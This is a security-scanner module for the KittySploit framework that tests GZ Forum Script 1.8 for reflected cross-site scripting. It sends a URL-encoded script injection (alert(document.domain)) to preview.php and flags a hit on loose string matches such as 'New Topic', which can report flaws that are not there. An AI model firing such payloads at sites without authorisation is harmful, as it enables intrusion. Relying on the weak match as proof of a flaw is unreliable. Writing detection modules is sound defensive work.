#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cross-site scripting (XSS) is an attack in which an attacker injects malicious executable scripts into the cod."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'GZ Forum Script 1.8 - Cross-Site Scripting Detection',
        'description': 'Cross-site scripting (XSS) is an attack in which an attacker injects malicious executable scripts into the code of a trusted application or website. Attackers often initiate an XSS attack by sending a malicious link to a user and enticing the user to click it.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'gzforum', 'xss', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://www.exploit-db.com/exploits/51559', 'https://gzscripts.com/gz-forum-script.html'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/preview.php?controller=Load&action=index&catid=moztj%22%3E%3Cscript%3Ealert(document.domain)%3C%2fscript%3Ems3ea&down_up=a', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('><script>alert(document.domain)</script>', 'New Topic', 'text/html',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="GZ Forum Script 1.8 - Cross-Site Scripting detected",
                path='/preview.php?controller=Load&action=index&catid=moztj%22%3E%3Cscript%3Ealert(document.domain)%3C%2fscript%3Ems3ea&down_up=a',
            )
            return True
        return False

